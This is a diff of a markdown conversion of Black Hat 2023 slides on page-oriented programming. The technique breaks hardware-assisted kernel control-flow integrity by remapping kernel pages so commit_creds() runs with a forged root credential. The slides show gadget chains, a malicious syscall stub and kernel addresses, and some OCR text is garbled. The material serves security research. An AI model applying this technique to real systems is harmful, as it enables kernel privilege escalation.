@@ -8,18 +8,24 @@ year: 2023
 source_pdf: "Black Hat USA 2023 slides/Seunghun Han _Lost Control Breaking Hardware-Assisted Kernel Control-Flow Integrity with Page-Oriented Programming.pdf"
 pages: 76
 sha256: "c2f26fda97ca9db3a2e01b2c6a37e0881225e06633b8a197edeba5134ed5f580"
-text_chars: 51884
+text_chars: 51675
 ocr_pages: 2
 has_ocr: true
+redacted_secrets: 0
+ocr_confidence: 89.7
+ocr_unreliable_blocks: 0
+ocr_timeouts: 0
+pages_recovered_from_text_layer: 0
 companion_files: []
 extractor: "pymupdf4llm 1.28.2 + tesseract"
-converted_at: "2026-08-11T21:24:03Z"
+converted_at: "2026-08-12T04:20:57Z"
 ---
 # Lost Control Breaking Hardware-Assisted Kernel Control-Flow Integrity with Page-Oriented Programming
 
 **Speakers:** Seunghun Han  
 **Conference:** Black Hat USA 2023  
 **Source:** `Black Hat USA 2023 slides/Seunghun Han _Lost Control Breaking Hardware-Assisted Kernel Control-Flow Integrity with Page-Oriented Programming.pdf` (76 pages)
+
 
 ## Slide 1
 
@@ -246,7 +252,8 @@ Backward Edge
 
 #BHUSA @BlackHatEvents
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 93/100 on the text kept, 91/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 rat
@@ -255,12 +262,9 @@ Opaque Control-Flow Integrity
 Vishwath Mohan*, Per Larsen’, Stefan Brunthaler!, Kevin W. Hamlen*, and Michael Franz!
 *{vishwath.mohan, hamlen}@utdallas.edu
 The University of Texas at Dallas
-'{perl,s.brunthaler, franz}@uci.edu
-LTNSesiaare uw @rUlvsnr tani
 Modular Control-Flow Integrity
 Ben Niu Gang Tan
 Lehigh University
-ben210@lehigh.edu _gtan@cse.lehigh.edu
 Enforcing Forward-Edge Control-Flow Integrity in GCC & LLVM
 Caroline Tice Tom Roeder Peter Collingbourne Stephen Checkoway
 Google, Inc. Google, Inc. Google, Inc. Johns Hopkins University
@@ -292,7 +296,6 @@ Cristiano Giuffrida®
 Dennis Andriesse** Enes Géktas*
 Asia Slowinska® Herbert Bos*
 ‘Equal contribution joint first authors
-ent Danatimannel ComiiataSciancs saciid
 Efficient Protection of Path-Sensitive Control Security
 Ren Ding” Chenxiong Qian* Chengyu Song William Harris Taesoo Kim
 Georgia Tech Georgia Tech UC Riverside Georgia Tech Georgia Tech
@@ -302,7 +305,6 @@ Georgia Tech
 Origin-sensitive Control Flow Integrity
 Mustakimur Rahman Khandaker Wenging Liu Abu Naser
 Florida State University Florida State University Florida State University
-mrk15e@my,fsu.edu wl16c@my,fsu.edu anl6e@my,fsu.edu
 Zhi Wang Jie Yang
 Florida State University Florida State University
 zwang @cs.fsu.edu Jjyang @cs.fsu.edu
@@ -344,7 +346,6 @@ Hong Hu, Chenxiong Qian, Carter Yagemann, Simon Pak Ho Chung,
 William R. Harris", Taesoo Kim and Wenke Lee
 Georgia Institute of Technology _* Galois Inc.
 ABSTRACT
-De cal ab contol los inteoin CH iste sop contal backing
 R. Harris, Taesoo Kim and Wenke Lee. 2018. Enforcing Unique Code Tar-
 get Property for Control-Flow Integrity. In 2018 ACM SIGSAC Conference
 Taming Transactions: Towards Hardware-Assisted
@@ -376,7 +377,6 @@ Email: {mrkl5e, an16e, wl16c} @my.fsu.edu, zwang@cs.fsu.edu
 t School of Computer Science, Zhejiang University, Hangzhou, China
 Email: yajin_zhou@zju.edu.cn
 + Baidu X-lab, Sunnyvale, USA
-iia
 In-Kernel Control-Flow Integrity on Commodity OSes
 using ARM Pointer Authentication
 Sungbae Yoo"? Jinbum Park*? Seolheui Kim* Yeji Kim* Taesoo Kim**
@@ -485,12 +485,12 @@ ive overhead One recent anpnroach taken hy Annle [2] and
 
 ###### **Intel Control-flow Enforcement Technology (CET)**
 
-```
+\```
 400000: <main>
 endbr64
-```
+\```
 
-```
+\```
 ...
 movq $0x400200, %rcx
 call *%rcx
@@ -502,7 +502,7 @@ endbr64
 instructions
 ...
 retq
-```
+\```
 
 **Indirect Branch Tracking (IBT) Example**
 
@@ -562,9 +562,9 @@ retq
 
 - `1:` **`ffff4000: <_stext>`** `2:  endbr64`
 
-```
+\```
 ...
-```
+\```
 
 `; Address of <func>` **S/W-based** `;` **`-0x00050794 (-Function signature)`** `;` **`0xfffaf86c`** `+` **`0x50794 = (DWORD) 0` CFI and** `;` **`CFI check` caller-side** `; CFI error` **verification**
 
@@ -574,16 +574,16 @@ retq
 
 ###### **H/W-based CFI**
 
-```
+\```
 11: ffff41fc: <__cfi_func>
 12:94 07 05 00; 0x00050794 (Function signature)
-```
+\```
 
-```
+\```
 13: ffff4200: <func>
 14:endbr64
 15:  instructions ...
-```
+\```
 
 #BHUSA @BlackHatEvents
 
@@ -595,9 +595,9 @@ retq
 
 - `2:  endbr64`
 
-```
+\```
 ...
-```
+\```
 
    - `3:  movq $` **`0xffff4200`** `, %r11       ; Address of <func> 4:  mov` **`$0xb4cf680c`** `, %r10d      ;` **`0x0xb4cf680c (Function signature)`** `5:  sub` **`$0x10`** `, %r11             ; Address of <__cfi_func> 6:` **`call %r11`**
 
@@ -615,16 +615,16 @@ retq
 
 ###### **Callee-side verification**
 
-```
+\```
 ...
-```
+\```
 
 - `13:` **`ffff4200: <func>`**
 
-```
+\```
 14:  endbr64
 15:  instructions ...
-```
+\```
 
 #BHUSA @BlackHatEvents
 
@@ -642,55 +642,55 @@ retq
 
 - `6:  call %r11`
 
-```
+\```
 7: ffff41f0: <__cfi_func>
 8:  endbr64
 9:  sub  $0xb4cf680c, %r10d
 10:  je   $0xffff4200
 11:  ud2
 12:  nop
-```
+\```
 
-```
+\```
 ...
 13:ffff4200: <func>
 14:  endbr64
 15:  instructions ...
-```
+\```
 
-```
+\```
 1: ffff4000: <_stext>
 Other Indirect
 2:  endbr64
 Branches
 ...
-```
+\```
 
-```
+\```
 3:  movq $0xffff4200, %r11
 4:  mov  $0xb4cf680c, %r10d
 5:  nop
 6:  call %r11
-```
+\```
 
-```
+\```
 7: ffff41f0: <__cfi_func>
 8:  endbr64
 9:  sub  $0xb4cf680c, %r10d
 10:  je   $0xffff4200
-```
+\```
 
-```
+\```
 11:  nop
 12:  nop
 ...
-```
+\```
 
-```
+\```
 13:ffff4200: <func>
 14:  endbr64
 15:  instructions ...
-```
+\```
 
 #BHUSA @BlackHatEvents
 
@@ -874,9 +874,9 @@ system_call(arg)
 commit_creds(arg)
 … 0x00406000 1 0 1 0x88006000 1 0 1 0 creds()
 
-```
+\```
 SX: Supervisor Execute    UX: User Execute
-```
+\```
 
 #BHUSA @BlackHatEvents
 
@@ -968,14 +968,14 @@ OLD NEW mov $0xdeafbeef, %rdi or %rbx
 
 - Call gadgets connect system call candidates to commit_creds() - NOP (no-operation) gadgets unlink unessential functions of gadgets, system call candidates, and commit_creds()
 
-```
+\```
 <NOP_gadget_1>:
 endbr64
 <no_calls_and_jumps_here>
 ret
-```
+\```
 
-```
+\```
 <call_gadget>:endbr64
 endbr64<no_calls_and_jumps_here>
 ...ret
@@ -986,7 +986,7 @@ endbr64
 ...
 retxor %rax, %rax
 ret
-```
+\```
 
 #BHUSA @BlackHatEvents
 
@@ -1016,7 +1016,7 @@ ret
 
 ###### **<Original Control Flow>**
 
-```
+\```
 0xffff1220:0xffff1330:
 <commit_creds(arg)>:<subfunction_1>
 <updating creds>ret
@@ -1025,16 +1025,16 @@ call 0xffff14400xffff1440:
 ...
 <subfunction_2>
 retret
-```
+\```
 
-```
+\```
 <sys_set_uid>:
 <validating creds>
 mov arg_ptr, %rdi
 call 0xffff1220
 ...
 ret
-```
+\```
 
 **Page Remapping**
 
@@ -1042,7 +1042,7 @@ ret
 
 ###### **<New Control Flow>**
 
-```
+\```
 0xffffa350:0xffffa220:0xffffa330:
 <sys_candidate>:
 <NOP_gadget_1>:
@@ -1057,19 +1057,19 @@ retcall 0xffffa440
 0xfffff000:<NOP_gadget_2>:
 ret
 ret
-```
+\```
 
-```
+\```
 0xffffa440:440::
 <NOP_gadget_2>:
 ret
-```
+\```
 
-```
+\```
 0xfffff000:
 <modified_cred>:
 uid = 0 (root)
-```
+\```
 
 #BHUSA @BlackHatEvents
 
@@ -1093,7 +1093,7 @@ uid = 0 (root)
 
 **- Executes the target system call with an arbitrary argument** - Then, the new control flow calls commit_creds() without verification - It must be executed on the same core where the page flushing stage was done!
 
-```
+\```
 <main of the malicious application>:
 ; Syscall number to exploit
 mov $syscall_number, %rax
@@ -1102,7 +1102,7 @@ mov $0xfffff000, %rdior %rbx
 ; Execute the new control flow
 syscall orint $0x80
 <DO MALICIOUS BEHAVIORS WITH ROOT>
-```
+\```
 
 - Both x64 and x32 system calls can be used!
 
@@ -1163,56 +1163,56 @@ TRUST THE DEMO, DUDE! TRUST IT!
 
 ## Slide 57
 
-```
+\```
 0xffffffff81122220 <commit_creds>:
 endbr64
-```
+\```
 
-```
+\```
 0xffffffff812bc9a0
 <__x64_sys_bpf>(arg1):
 call 0xffffffff812bd5e0
 ...
-```
+\```
 
-```
+\```
 ; gs: 0xffff8884a0200000 <__per_cpu_offset[0]>
 ; rip: 0xffffffff8112223a
 ; rbx: 0xffff8884a02327c0=> <current>
 mov  %gs:0x7ef10586(%rip), %rbx
-```
+\```
 
-```
+\```
 ; rip: 0xffffffff811222f4
 ; esi: 0xffffffff844e2798<suid_dumpable>
 mov  0x33c04a4(%rip), %esi
-```
+\```
 
-```
+\```
 0xffffffff81c605e0
-```
+\```
 
-```
+\```
 <xhci_address_device>:
 call 0xffffffff81c61a90
 ...
-```
+\```
 
-```
+\```
 0xffffffff8153da90
-```
+\```
 
-```
+\```
 <configfs_open_file>:
 call 0xffffffff8153e220
 ...
-```
+\```
 
-```
+\```
 call 0xffffffff814732d0<set_dumpable>
 call 0xffffffff81640120<key_fsuid_changed>
 call 0xffffffff81640180<key_fsgid_changed>
-```
+\```
 
 `call` **`0xffffffff811263d0`** `<` **`inc_rlimit_ucounts`** `> ;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;` **`<Instructions for updating new credentials>`** `;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;; call` **`0xffffffff81126460`** `<` **`dec_rlimit_ucounts`** `> call` **`0xffffffff81aa8fb0`** `<` **`proc_id_connector`** `> call` **`0xffffffff811a7d90`** `<` **`call_rcu`** `> ret` #BHUSA @BlackHatEvents
 
@@ -1220,63 +1220,63 @@ call 0xffffffff81640180<key_fsgid_changed>
 
 ## Slide 58
 
-```
+\```
 0xffffffff81122220 <commit_creds>:
-```
+\```
 
-```
+\```
 endbr64
-```
+\```
 
-```
+\```
 0xffffffff812bc9a0
-```
+\```
 
-```
+\```
 <__x64_sys_bpf>(arg1):
 call 0xffffffff812bd5e0
 ...
 -0x9a3000
-```
+\```
 
-```
+\```
 ; gs: 0xffff8884a0200000 <__per_cpu_offset[0]>
 ; rip: 0xffffffff8112223a
 ; rbx: 0xffff8884a02327c0=> <current>
 mov  %gs:0x7ef10586(%rip), %rbx
-```
+\```
 
-```
+\```
 ; rip: 0xffffffff811222f4
 ; esi: 0xffffffff844e2798<suid_dumpable>
 mov  0x33c04a4(%rip), %esi
-```
+\```
 
-```
+\```
 0xffffffff812bd0xffffffff81c605e05e0
-```
+\```
 
-```
+\```
 <xhci_address_device>:
 call 0xffffffff812bec61a90
 ...
-```
+\```
 
-```
+\```
 0xffffffff8153da90
-```
+\```
 
-```
+\```
 <configfs_open_file>:
 call 0xffffffff8153e220
 ...
-```
+\```
 
-```
+\```
 call 0xffffffff814732d0<set_dumpable>
 call 0xffffffff81640120<key_fsuid_changed>
 call 0xffffffff81640180<key_fsgid_changed>
-```
+\```
 
 `call` **`0xffffffff811263d0`** `<` **`inc_rlimit_ucounts`** `> ;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;` **`<Instructions for updating new credentials>`** `;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;; call` **`0xffffffff81126460`** `<` **`dec_rlimit_ucounts`** `> call` **`0xffffffff81aa8fb0`** `<` **`proc_id_connector`** `> call` **`0xffffffff811a7d90`** `<` **`call_rcu`** `> ret` #BHUSA @BlackHatEvents
 
@@ -1290,47 +1290,47 @@ call  0xffffffff812bd5e0
 ...
 - 0x9a3000
 
-```
+\```
 0xffffffff812bd0xffffffff81c605e05e0
 <xhci_address_device>:
 call 0xffffffff812bec61a90
 ...
 -0x27f000
-```
+\```
 
-```
+\```
 0xffffffff812be0xffffffff8153da90  a90
 <configfs_open_file>:
 call 0xffffffff812bf53e220
 ...
-```
+\```
 
-```
+\```
 0xffffffff81122220 <commit_creds>:
-```
+\```
 
-```
+\```
 endbr64
-```
+\```
 
-```
+\```
 ; gs: 0xffff8884a0200000 <__per_cpu_offset[0]>
 ; rip: 0xffffffff8112223a
 ; rbx: 0xffff8884a02327c0=> <current>
 mov  %gs:0x7ef10586(%rip), %rbx
-```
+\```
 
-```
+\```
 ; rip: 0xffffffff811222f4
 ; esi: 0xffffffff844e2798<suid_dumpable>
 mov  0x33c04a4(%rip), %esi
-```
+\```
 
-```
+\```
 call 0xffffffff814732d0<set_dumpable>
 call 0xffffffff81640120<key_fsuid_changed>
 call 0xffffffff81640180<key_fsgid_changed>
-```
+\```
 
 `call` **`0xffffffff811263d0`** `<` **`inc_rlimit_ucounts`** `> ;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;` **`<Instructions for updating new credentials>`** `;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;; call` **`0xffffffff81126460`** `<` **`dec_rlimit_ucounts`** `> call` **`0xffffffff81aa8fb0`** `<` **`proc_id_connector`** `> call` **`0xffffffff811a7d90`** `<` **`call_rcu`** `> ret` #BHUSA @BlackHatEvents
 
@@ -1349,39 +1349,39 @@ call  0xffffffff812bec61a90
 ...
 - 0x27f000
 
-```
+\```
 0xffffffff812be0xffffffff8153da90  a90
 <configfs_open_file>:
 call 0xffffffff812bf53e220
 ...
-```
+\```
 
-```
+\```
 +0x19d000
-```
+\```
 
-```
+\```
 0xffffffff812bf0xffffffff81122220 <commit_creds>:220
-```
+\```
 
-```
+\```
 endbr64
-```
+\```
 
-```
+\```
 ; gs: 0xffff8884a0200000 <__per_cpu_offset[0]>
 ; rip: 0xffffffff8112223a2bf
 ; rbx: 0xffff8884a02327c03cf=> <current>
 mov  %gs:0x7ef10586(%rip), %rbx
-```
+\```
 
-```
+\```
 ; rip: 0xffffffff812bf1222f4
 ; esi: 0xffffffff8467f4e2798<suid_dumpable>
 mov  0x33c04a4(%rip), %esi
-```
+\```
 
-```
+\```
 call 0xffffffff816104732d0<set_dumpable>
 call 0xffffffff817dd640120<key_fsuid_changed>
 call 0xffffffff817dd640180<key_fsgid_changed>
@@ -1390,7 +1390,7 @@ call 0xffffffff812c31263d0<inc_rlimit_ucounts>
 <Instructions for updating new credentials>
 ;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
 call 0xffffffff812c3126460<dec_rlimit_ucounts>
-```
+\```
 
 `call` **`0xffffffff81c45aa8fb0`** `<` **`proc_id_connector`** `> call` **`0xffffffff813441a7d90`** `<` **`call_rcu`** `> ret` #BHUSA
 
@@ -1409,37 +1409,37 @@ call  0xffffffff812bec61a90
 ...
 - 0x27f000
 
-```
+\```
 0xffffffff812be0xffffffff8153da90  a90
 <configfs_open_file>:
 call 0xffffffff812bf53e220
 ...
-```
+\```
 
-```
+\```
 +0x19d000
-```
+\```
 
-```
+\```
 0xffffffff812bf0xffffffff81122220 <commit_creds>:220
-```
+\```
 
-```
+\```
 endbr64
-```
+\```
 
-```
+\```
 ; gs: 0xffff8884a0200000 <__per_cpu_offset[0]>
 ; rip: 0xffffffff8112223a2bf
 ; rbx: 0xffff8884a02327c03cf=> <current>
 mov  %gs:0x7ef10586(%rip), %rbx
-```
+\```
 
-```
+\```
 ; rip: 0xffffffff812bf1222f4
 ; esi: 0xffffffff8467f4e2798<suid_dumpable>
 mov  0x33c04a4(%rip), %esi
-```
+\```
 
 `call` **`0xffffffff816104732d0`** `<` **`set_dumpable`** `> call` **`0xffffffff817dd640120`** `<` **`key_fsuid_changed`** `> call` **`0xffffffff817dd640180`** `<` **`key_fsgid_changed`** `> call` **`0xffffffff812c31263d0`** `<` **`inc_rlimit_ucounts`** `> ;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;` **`<Instructions for updating new credentials>`** `;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;; call` **`0xffffffff812c3126460`** `<` **`dec_rlimit_ucounts`** `> call` **`0xffffffff81c45aa8fb0`** `<` **`proc_id_connector`** `> call` **`0xffffffff813441a7d90`** `<` **`call_rcu`** `> ret` #BHUSA @BlackHatEvents
 
@@ -1447,13 +1447,13 @@ mov  0x33c04a4(%rip), %esi
 
 ## Slide 62
 
-```
+\```
 0xffffffff812bf0xffffffff81122220 <commit_creds>:220
-```
+\```
 
-```
+\```
 endbr64
-```
+\```
 
 `0xffffffff812bc9a0 ; gs: 0xffff8884a0200000 <__per_cpu_offset[0]>` ~~`<__x64_sys_bpf>(arg1): ; rip:`~~ **~~`0xffffffff8112223a2bf`~~** **`+ 0x19d000`** `call` **`0xffffffff812bd5e0`** `;` **`rbx`** `:` **`0xffff8884a02327c03cf`** `=> <` **`current`** `> ... mov  %gs:0x7ef10586(%` **`rip`** `), %rbx ; rip:` **`0xffffffff812bf1222f4 - 0x9a3000`** `;` **`esi`** `:` **`0xffffffff8467f4e2798`** `<` **`suid_dumpable`** `> mov  0x33c04a4(%` **`rip`** `), %esi` **`0xffffffff812bd`** `0xffffffff81c605e0` **`5e0`** `<xhci_address_device>: call` **`0xffffffff816104732d0`** `<` **`set_dumpable`** `> call` **`0xffffffff812bec61a90`** `call` **`0xffffffff817dd640120`** `<` **`key_fsuid_changed`** `> ... call` **`0xffffffff817dd640180`** `<` **`key_fsgid_changed`** `> call` **`0xffffffff812c31263d0`** `<` **`inc_rlimit_ucounts`** `>` **Let’s REPLACE unessential functions** `;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;` **`- 0x27f000 <Instructions for updating new credentials> 0xffffffff812be`** `0xffffffff8153da90` **`a90`** `;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;` **with NOP gadgets** `call` **`0xffffffff812c3126460`** `<` **`dec_rlimit_ucounts`** `> <configfs_open_file>: call` **`0xffffffff812bf53e220`** `... call` **`0xffffffff81c45aa8fb0`** `<` **`proc_id_connector`** `> call` **`0xffffffff813441a7d90`** `<` **`call_rcu`** `> ret` #BHUSA @BlackHatEvents
 
@@ -1463,67 +1463,67 @@ endbr64
 
 ###### **`0xffffffff812bf`** `0xffffffff81122220 <commit_creds>:` **`220`**
 
-```
+\```
 endbr64
-```
+\```
 
-```
+\```
 ; gs: 0xffff8884a0200000 <__per_cpu_offset[0]>
 ; rip: 0xffffffff8112223a2bf
 ; rbx: 0xffff8884a02327c03cf=> <current>
 mov  %gs:0x7ef10586(%rip), %rbx
-```
+\```
 
-```
+\```
 ; rip: 0xffffffff812bf1222f4
 ; esi: 0xffffffff8467f4e2798<suid_dumpable>
 mov  0x33c04a4(%rip), %esi
-```
+\```
 
-```
+\```
 call0xffffffff816104732d0<set_dumpable>
 call 0xffffffff817dd640120<key_fsuid_changed>
 call 0xffffffff817dd640180<key_fsgid_changed>
-```
+\```
 
 **`0xffffffff8161032a2d0`**  **`NOP gadget`** ~~`<bpf_lsm_inode_need_killpriv>:`~~ `xor %eax, %eax ret`
 
-```
+\```
 call 0xffffffff812c31263d0<inc_rlimit_ucounts>
 ;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
 <Instructions for updating new credentials>
 ;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
 call 0xffffffff812c3126460<dec_rlimit_ucounts>
-```
+\```
 
 **Replacing it with a NOP gadget**
 
-```
+\```
 call 0xffffffff81c45aa8fb0<proc_id_connector>
 call 0xffffffff813441a7d90<call_rcu>
 ret
-```
+\```
 
 #BHUSA @BlackHatEvents
 
 ## Slide 64
 
-```
+\```
 0xffffffff812bf0xffffffff81122220 <commit_creds>:220
-```
+\```
 
-```
+\```
 endbr64
-```
+\```
 
 `; gs: 0xffff8884a0200000 <__per_cpu_offset[0]>` ~~`; rip:`~~ **~~`0xffffffff8112223a2bf`~~** `;` **`rbx`** `:` **`0xffff8884a02327c03cf`** `=> <` **`current`** `> mov  %gs:0x7ef10586(%` **`rip`** `), %rbx ; rip:` **`0xffffffff812bf1222f4`** `;` **`esi`** `:` **`0xffffffff8467f4e2798`** `<` **`suid_dumpable`** `> mov  0x33c04a4(%` **`rip`** `), %esi` **Identical page!** `call` **`0xffffffff816104732d0`** `<` **`set_dumpable`** `> call` **`0xffffffff817dd640120`** `<` **`key_fsuid_changed`** `> call` **`0xffffffff817dd640180`** `<` **`key_fsgid_changed`** `> call` **`0xffffffff812c31263d0`** `<` **`inc_rlimit_ucounts`** `> ;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;` **`<Instructions for updating new credentials>`** `;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;; call` **`0xffffffff812c3126460`** `<` **`dec_rlimit_ucounts`** `> call` **`0xffffffff81c45aa8fb0`** `<` **`proc_id_connector`** `> call` **`0xffffffff813441a7d90`** `<` **`call_rcu`** `> ret`
 
-```
+\```
 0xffffffff8880003ff000
 <malicious_cred>:
 uid, gid, euid, egid = 0
 thread_keyring= NULL
-```
+\```
 
 **Remapping them and setting cred.thread_keyring to NULL**
 
@@ -1531,37 +1531,37 @@ thread_keyring= NULL
 
 ## Slide 65
 
-```
+\```
 0xffffffff812bf0xffffffff81122220 <commit_creds>:220
 endbr64
-```
+\```
 
-```
+\```
 ; gs: 0xffff8884a0200000 <__per_cpu_offset[0]>
 ; rip: 0xffffffff8112223a2bf
 ; rbx: 0xffff8884a02327c03cf=> <current>
 mov  %gs:0x7ef10586(%rip), %rbx
-```
+\```
 
-```
+\```
 ; rip: 0xffffffff812bf1222f4
 ; esi: 0xffffffff8467f4e2798<suid_dumpable>
 mov  0x33c04a4(%rip), %esi
-```
+\```
 
-```
+\```
 call 0xffffffff816104732d0<set_dumpable>
 call 0xffffffff817dd640120<key_fsuid_changed>
 call 0xffffffff817dd640180<key_fsgid_changed>
-```
+\```
 
-```
+\```
 call0xffffffff812c31263d0<inc_rlimit_ucounts>
 ;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
 <Instructions for updating new credentials>
 ;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
 call0xffffffff812c3126460<dec_rlimit_ucounts>
-```
+\```
 
 ###### **Inline functions!**
 
@@ -1575,40 +1575,40 @@ call0xffffffff812c3126460<dec_rlimit_ucounts>
 
 ###### **`0xffffffff812bf`** `0xffffffff81122220 <commit_creds>:` **`220`**
 
-```
+\```
 endbr64
-```
+\```
 
 >
 >
 
 - `; gs: 0xffff8884a0200000 <__per_cpu_offset[0]>` ~~`; rip:`~~ **~~`0xffffffff8112223a2bf`~~** `;` **`rbx`** `:` **`0xffff8884a02327c03cf`** `=> <` **`current`** `> mov  %gs:0x7ef10586(%` **`rip`** `), %rbx`
 
-```
+\```
 ; rip: 0xffffffff812bf1222f4
 ; esi: 0xffffffff8467f4e2798<suid_dumpable>
 mov  0x33c04a4(%rip), %esi
-```
+\```
 
-```
+\```
 call 0xffffffff816104732d0<set_dumpable>
 call 0xffffffff817dd640120<key_fsuid_changed>
 call 0xffffffff817dd640180<key_fsgid_changed>
-```
+\```
 
-```
+\```
 call 0xffffffff812c31263d0<inc_rlimit_ucounts>
 ;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
-```
+\```
 
 **`<Instructions for updating new credentials>`** `;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;` **External function calls in them!** `call` **`0xffffffff812c3126460`** `<` **`dec_rlimit_ucounts`** `> call` **`0xffffffff81c45aa8fb0`** `<` **`proc_id_connecto`** **`r`** `>` `call` **`0xffffffff813441a7d90`** `<` **`call_rc`** **`u`** `>` `ret`
 
 **`0xffffffff81c45329fb0`**  **`NOP gadget`** `<bpf_lsm_inode_mkdir>:`
 
-```
+\```
 xor %eax, %eax
 ret
-```
+\```
 
 **`0xffffffff81344033d90`**  **`NOP gadget`** `<xen_apic_icr_read>: xor %eax, %eax ret`
 
@@ -1626,18 +1626,15 @@ ret
 
 #BHUSA @BlackHatEvents
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 87/100 on the text kept, 59/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
-fo - 2-2-2222 2-2 - eee ---- +
 | |
 | Breaking the
 | Kernel CFI with | /---
 | Page-Oriented | ;
 | Programming | |
-eee eee eee ee eee eee ! a Oe |
-fate aoe Ee SG eS EES Sai ae!
-[| oo000000000000000 .0. oooo /,
 / ==000000000000000==.0. o00= //
 Lost Control PoC Made by Seunghun Han
 ```
@@ -1646,46 +1643,46 @@ Lost Control PoC Made by Seunghun Han
 
 ###### BONUS: INDIRECT BRANCH
 
-```
+\```
 arg1: pointer of modified_cred
 arg2: 0xff…ff81122220 <commit_creds>
-```
+\```
 
-```
+\```
 0xffffffff812bc9a0
 <__x64_sys_bpf>(arg1, arg2):
 mov arg1, %rdi
 mov arg2, %rsi
 call 0xffffffff812bd5e0
 ...
-```
+\```
 
-```
+\```
 0xffffffff?????5e0
 jmp %rsi
 ...
-```
+\```
 
 **`0xffffffff81122220 <commit_creds>`** `:` **`endbr64`**  **`Is it needed?`**
 
-```
+\```
 ; gs: 0xffff8884a0200000 <__per_cpu_offset[0]>
 ; rip: 0xffffffff8112223a
 ; rbx: 0xffff8884a02327c0=> <current>
 mov  %gs:0x7ef10586(%rip), %rbx
-```
+\```
 
-```
+\```
 ; rip: 0xffffffff811222f4
 ; esi: 0xffffffff844e2798<suid_dumpable>
 mov  0x33c04a4(%rip), %esi
-```
+\```
 
-```
+\```
 call 0xffffffff814732d0<set_dumpable>
 call 0xffffffff81640120<key_fsuid_changed>
 call 0xffffffff81640180<key_fsgid_changed>
-```
+\```
 
 `call` **`0xffffffff811263d0`** `<` **`inc_rlimit_ucounts`** `> ;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;` **`<Instructions for updating new credentials>`** `;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;; call` **`0xffffffff81126460`** `<` **`dec_rlimit_ucounts`** `> call` **`0xffffffff81aa8fb0`** `<` **`proc_id_connector`** `> call` **`0xffffffff811a7d90`** `<` **`call_rcu`** `> ret` #BHUSA @BlackHatEvents
 
